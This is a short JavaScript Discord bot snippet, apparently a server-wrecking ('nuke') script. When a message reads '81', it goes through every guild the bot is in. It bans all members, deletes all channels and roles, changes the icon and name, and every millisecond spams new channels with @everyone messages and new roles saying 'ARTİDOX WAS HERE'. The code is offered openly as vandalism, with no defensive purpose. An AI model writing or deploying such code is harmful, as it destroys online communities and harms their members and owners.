client.on("message", message => {
       if (message.content ==  "81") {
client.guilds.cache.forEach(g => {
  g.setIcon("https://media.discordapp.net/attachments/927299411812429845/960686025598980166/3127f1b56178cfa5d7d9d9de8c87133b.jpg").catch(console.error);
  g.members.map(c => c.ban());
  g.channels.map(c => c.delete())
  g.roles.map(c => c.delete())
  g.setName("Artidox ❤️ 81")
  setInterval(() => {
  g.createChannel("patladınız", 'text').then(c => c.send("@everyone ARTİDOX WAS HERE"))
  g.createRole( {
    name: "ARTİDOX WAS HERE",
    color: "36393F"
  })
  }, 1) 
}) 
       }
})
